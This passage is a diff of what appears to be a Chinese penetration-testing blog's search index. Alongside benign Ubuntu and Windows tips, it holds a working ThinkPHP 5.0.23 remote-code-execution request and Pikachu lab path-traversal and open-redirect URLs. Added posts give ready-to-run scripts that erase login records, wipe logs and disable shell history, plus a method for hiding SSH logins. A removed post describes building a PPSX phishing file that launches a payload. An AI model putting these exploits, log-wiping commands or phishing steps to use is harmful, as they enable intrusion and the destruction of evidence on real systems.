@@ -494,6 +494,38 @@
       </categories>
   </entry>
   <entry>
+    <title>ubuntu彻底卸载软件</title>
+    <url>/2023/05/31/Linux%E7%9B%B8%E5%85%B3/ubuntu%E5%BD%BB%E5%BA%95%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6/</url>
+    <content><![CDATA[<h3 id="如果知道软件的具体名称"><a href="#如果知道软件的具体名称" class="headerlink" title="如果知道软件的具体名称"></a>如果知道软件的具体名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove --purge 软件名称  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove --purge 软件名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230531091751652.png" alt="image-20230531091751652"></p>
+<h3 id="如果不知道要删除软件的具体名称"><a href="#如果不知道要删除软件的具体名称" class="headerlink" title="如果不知道要删除软件的具体名称"></a>如果不知道要删除软件的具体名称</h3><h5 id="列出软件的具体名称"><a href="#列出软件的具体名称" class="headerlink" title="列出软件的具体名称"></a>列出软件的具体名称</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --get-selections | grep ‘软件相关名称’</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230531091900581.png" alt="image-20230531091900581"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep ‘软件相关名称’</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230531092119136.png" alt="image-20230531092119136"></p>
+<h5 id="卸载程序"><a href="#卸载程序" class="headerlink" title="卸载程序"></a>卸载程序</h5><p>除了上述使用的命令，还可以使用下述命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge ‘软件相关名称’</span><br></pre></td></tr></table></figure>
+
+<p>一个带core的package，如果没有带core的package，则是情况而定。</p>
+<p><img src="/images/image-20230531092214242.png" alt="image-20230531092214242"></p>
+<h3 id="清理残留数据"><a href="#清理残留数据" class="headerlink" title="清理残留数据"></a>清理残留数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpkg -P </span><br></pre></td></tr></table></figure>
+
+<p>此时清理的是所有已卸载程序的残留数据，不止是上述卸载的程序</p>
+<p><img src="/images/image-20230531092302141.png" alt="image-20230531092302141"></p>
+<h5 id="如果此时没有残留数据"><a href="#如果此时没有残留数据" class="headerlink" title="如果此时没有残留数据"></a>如果此时没有残留数据</h5><p>则会出现err</p>
+<p><img src="/images/image-20230531092522589.png" alt="image-20230531092522589"></p>
+<p>就算给出具体的软件名，也会出现”未安装”的提示</p>
+<p><img src="/images/image-20230531092613122.png" alt="image-20230531092613122"></p>
+]]></content>
+      <categories>
+        <category>Linux相关</category>
+      </categories>
+  </entry>
+  <entry>
     <title>thinkphp 5.0.23-RCE利用</title>
     <url>/2023/05/18/POC/thinkphp%205.0.23-RCE%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 27 Feb 2019 06:32:09 GMT</span><br><span class="line">If-None-Match: &quot;5c762ee9-5&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
@@ -572,6 +604,52 @@
 ]]></content>
       <categories>
         <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>win10启用administrator</title>
+    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/win10%E5%90%AF%E7%94%A8administrator/</url>
+    <content><![CDATA[<h2 id="激活administrator"><a href="#激活administrator" class="headerlink" title="激活administrator"></a>激活administrator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> net user administrator /active:yes</span><br></pre></td></tr></table></figure>
+
+<p>管理员权限启用命令行</p>
+<p><img src="/images/1662534726671-48bd504b-690d-49e2-8b0f-f1ac984568e5.png"></p>
+<h2 id="计算机管理"><a href="#计算机管理" class="headerlink" title="计算机管理"></a>计算机管理</h2><p>在计算机管理中看到administrator用户已启用(其实可以直接在这改)</p>
+<p><img src="/images/1662535027870-6e98440a-1d08-4641-af33-7ef4bcf013c7.png"></p>
+<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><h5 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h5><p>管理员权限运行CMD</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user administrator xxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1662535437611-72be8af6-7237-4a5b-b9dd-b3da34e8b886.png"></p>
+<h5 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h5><p><img src="/images/1662535563235-10d0e3e8-88b4-4778-a761-44c1e88f2c57.png"></p>
+<p><img src="/images/1662535652493-99ed1d08-eed3-44f2-8e38-acacb8d70caf.png"></p>
+]]></content>
+      <categories>
+        <category>windows相关</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>windows中的cat命令</title>
+    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/windows%E4%B8%AD%E7%9A%84cat%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="命令行查看文本内容"><a href="#命令行查看文本内容" class="headerlink" title="命令行查看文本内容"></a>命令行查看文本内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type filename</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2022-11-18-14-33-44-image.png"></p>
+]]></content>
+      <categories>
+        <category>windows相关</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>判断windows是物理机还是虚拟机</title>
+    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/%E5%88%A4%E6%96%ADwindows%E6%98%AF%E7%89%A9%E7%90%86%E6%9C%BA%E8%BF%98%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
+    <content><![CDATA[<h3 id="111"><a href="#111" class="headerlink" title="111"></a>111</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Systeminfo | findstr /i &quot;BIOS&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230417095630088.png" alt="image-20230417095630088"></p>
+<h3 id="222"><a href="#222" class="headerlink" title="222"></a>222</h3><p>powershell命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell get-wmiobject win32_computersystem</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230417095750129.png" alt="image-20230417095750129"></p>
+]]></content>
+      <categories>
+        <category>windows相关</category>
       </categories>
   </entry>
   <entry>
@@ -666,24 +744,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-敏感信息泄露</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
-    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
-<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
-<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
-<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
-<p>成功登录</p>
-<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
-<p>并且发现，该后台为未授权接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
-
-<p>不需要登录也能访问</p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-RCE</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
     <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
@@ -733,6 +793,24 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/image-20230110101728753.png" alt="image-20230110101728753"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-敏感信息泄露</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
+    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
+<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
+<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
+<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
+<p>成功登录</p>
+<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
+<p>并且发现，该后台为未授权接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
+
+<p>不需要登录也能访问</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1530,18 +1608,22 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-不安全的文件下载</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
-<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
-<p>文件下载的url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-不安全的URL跳转</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
+    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
+<p>点击最后一个参数</p>
+<p>获取url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
 
-<p>如果未做好限制，则会造成任意文件下载</p>
-<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
+<p>url指定重定向后的网页</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
+<p>重定向到百度</p>
+<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
+<p>可以抓个包看看</p>
+<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
+<p>可以看到302响应包中的location字段指向百度</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1936,22 +2018,18 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-不安全的URL跳转</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
-    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
-<p>点击最后一个参数</p>
-<p>获取url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-不安全的文件下载</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
+<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
+<p>文件下载的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
 
-<p>url指定重定向后的网页</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>如果未做好限制，则会造成任意文件下载</p>
+<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
 
-<p>重定向到百度</p>
-<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
-<p>可以抓个包看看</p>
-<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
-<p>可以看到302响应包中的location字段指向百度</p>
+<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -2460,23 +2538,87 @@
       </categories>
   </entry>
   <entry>
-    <title>win10启用administrator</title>
-    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/win10%E5%90%AF%E7%94%A8administrator/</url>
-    <content><![CDATA[<h2 id="激活administrator"><a href="#激活administrator" class="headerlink" title="激活administrator"></a>激活administrator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> net user administrator /active:yes</span><br></pre></td></tr></table></figure>
+    <title>Linux各种痕迹清理</title>
+    <url>/2023/05/31/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/Linux%E5%90%84%E7%A7%8D%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
+    <content><![CDATA[<p>遇到新的痕迹清理会继续同步</p>
+<h2 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h2><table>
+<thead>
+<tr>
+<th>日志文件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;var&#x2F;log&#x2F;cron</td>
+<td>记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;cups</td>
+<td>记录打印信息的日志</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
+<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;mailog</td>
+<td>记录邮件信息</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;message</td>
+<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
+<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;secure</td>
+<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<h5 id="清除用户登陆日志脚本"><a href="#清除用户登陆日志脚本" class="headerlink" title="清除用户登陆日志脚本"></a>清除用户登陆日志脚本</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sip=$(lastlog | grep $(whoami) | awk &#x27;&#123;print $3&#125;&#x27;);utmpdump /var/run/utmp |sed &quot;/$sip/d&quot; |utmpdump -r &gt;/tmp/utmp1 &amp;&amp;\mv  /tmp/utmp1 /var/run/utmp;utmpdump /var/log/wtmp |sed &quot;/$sip/d&quot; |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv  /tmp/wtmp1 /var/log/wtmp;utmpdump /var/log/btmp |sed &quot;/$sip/d&quot; |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv  /tmp/wtmp1 /var/log/btmp;find /var/log/ /var/run/ -type f | xargs sed -i &quot;/$sip/d&quot;</span><br></pre></td></tr></table></figure>
 
-<p>管理员权限启用命令行</p>
-<p><img src="/images/1662534726671-48bd504b-690d-49e2-8b0f-f1ac984568e5.png"></p>
-<h2 id="计算机管理"><a href="#计算机管理" class="headerlink" title="计算机管理"></a>计算机管理</h2><p>在计算机管理中看到administrator用户已启用(其实可以直接在这改)</p>
-<p><img src="/images/1662535027870-6e98440a-1d08-4641-af33-7ef4bcf013c7.png"></p>
-<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><h5 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h5><p>管理员权限运行CMD</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user administrator xxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+<p><img src="/images/clipboard.png" alt="clipboard"></p>
+<p>last等日志是二进制文件，无法直接修改。所以清除的最简单方式是清空日志文件本身。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># &gt; /var/log/wtmp</span><br><span class="line"># &gt; /var/log/btmp</span><br><span class="line"># &gt; /var/log/lastlog</span><br><span class="line"># &gt; /var/log/wtmp; &gt; /var/log/btmp; &gt; /var/log/lastlog</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/1662535437611-72be8af6-7237-4a5b-b9dd-b3da34e8b886.png"></p>
-<h5 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h5><p><img src="/images/1662535563235-10d0e3e8-88b4-4778-a761-44c1e88f2c57.png"></p>
-<p><img src="/images/1662535652493-99ed1d08-eed3-44f2-8e38-acacb8d70caf.png"></p>
+<h2 id="history历史命令"><a href="#history历史命令" class="headerlink" title="history历史命令"></a>history历史命令</h2><h3 id="history命令相关"><a href="#history命令相关" class="headerlink" title="history命令相关"></a>history命令相关</h3><h5 id="SSH关闭历史命令-history"><a href="#SSH关闭历史命令-history" class="headerlink" title="SSH关闭历史命令(history)"></a>SSH关闭历史命令(history)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br></pre></td></tr></table></figure>
+
+<h5 id="不记录之后的命令"><a href="#不记录之后的命令" class="headerlink" title="不记录之后的命令"></a>不记录之后的命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set +o history</span><br></pre></td></tr></table></figure>
+
+<h5 id="用于清除当前的记录"><a href="#用于清除当前的记录" class="headerlink" title="用于清除当前的记录"></a>用于清除当前的记录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history -c</span><br></pre></td></tr></table></figure>
+
+<h3 id="x2F-root-x2F-bash-history相关"><a href="#x2F-root-x2F-bash-history相关" class="headerlink" title="&#x2F;root&#x2F;.bash_history相关"></a>&#x2F;root&#x2F;.bash_history相关</h3><p>bash_history也会记录历史命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>注意 .bash_history在执行history -c后不会有变化 </p>
+<h5 id="显示文件行号"><a href="#显示文件行号" class="headerlink" title="显示文件行号"></a>显示文件行号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -n /root/.bash_history</span><br></pre></td></tr></table></figure>
+
+<h5 id="删除500行以及以后的数据"><a href="#删除500行以及以后的数据" class="headerlink" title="删除500行以及以后的数据"></a>删除500行以及以后的数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i -e &#x27;500,$d&#x27; /root/.bash_history</span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql历史命令"><a href="#mysql历史命令" class="headerlink" title="mysql历史命令"></a>mysql历史命令</h2><p>mysql的历史命令记录存储于当前用户下的家目录的隐藏文件.mysql_history中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.mysql_history</span><br></pre></td></tr></table></figure>
+
+<p>清空该文件或者删除该文件就可以清空历史命令记录</p>
+<p><img src="/images/clipboard-1685497912147-2.png" alt="clipboard"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">head ~/.mysql_history</span><br><span class="line"># mysql的历史命令记录存储于当前用户下的家目录的隐藏文件.mysql_history中</span><br><span class="line"># 清空该文件或者删除该文件就可以清空历史命令记录</span><br><span class="line"></span><br><span class="line">&gt;~/.mysql_history</span><br><span class="line"># 再次使用mysql命令登录数据库，上下光标键就没有历史命令了</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>windows相关</category>
+        <category>痕迹清理</category>
       </categories>
   </entry>
   <entry>
@@ -2523,50 +2665,23 @@
       </categories>
   </entry>
   <entry>
-    <title>判断windows是物理机还是虚拟机</title>
-    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/%E5%88%A4%E6%96%ADwindows%E6%98%AF%E7%89%A9%E7%90%86%E6%9C%BA%E8%BF%98%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
-    <content><![CDATA[<h3 id="111"><a href="#111" class="headerlink" title="111"></a>111</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Systeminfo | findstr /i &quot;BIOS&quot;</span><br></pre></td></tr></table></figure>
+    <title>ssh隐身登录</title>
+    <url>/2023/05/30/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/ssh%E9%9A%90%E8%BA%AB%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T root@192.168.199.123 /usr/bin/bash -i</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20230417095630088.png" alt="image-20230417095630088"></p>
-<h3 id="222"><a href="#222" class="headerlink" title="222"></a>222</h3><p>powershell命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell get-wmiobject win32_computersystem</span><br></pre></td></tr></table></figure>
+<p>-T表示不分配伪终端</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;bash -i 表示在登录后调用bash命令</p>
+<p>-i 表示是交互式shell</p>
+<p>这样登陆将不会在w&#x2F;last命令结果中显示.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w/last</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20230417095750129.png" alt="image-20230417095750129"></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>但还是会被lsof -i:22 和 ps |grep ssh 等命令发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -i:22</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps |grep ssh</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>windows相关</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>windows中的cat命令</title>
-    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/windows%E4%B8%AD%E7%9A%84cat%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="命令行查看文本内容"><a href="#命令行查看文本内容" class="headerlink" title="命令行查看文本内容"></a>命令行查看文本内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type filename</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2022-11-18-14-33-44-image.png"></p>
-]]></content>
-      <categories>
-        <category>windows相关</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>PPT动作按钮特性构造PPSX钓鱼</title>
-    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
-<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
-<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
-<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
-
-<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
-<p>如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
-<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
-<p>该利用方式同时适用于wps</p>
-]]></content>
-      <categories>
-        <category>社工</category>
+        <category>痕迹清理</category>
       </categories>
   </entry>
   <entry>
@@ -2661,6 +2776,27 @@
 <h5 id="点击链接"><a href="#点击链接" class="headerlink" title="点击链接"></a>点击链接</h5><p>输入用户名密码后提交会跳转到学信网首页</p>
 <p><img src="/images/1666077573405-31eae495-4fc6-453e-b366-90f566220485.png"></p>
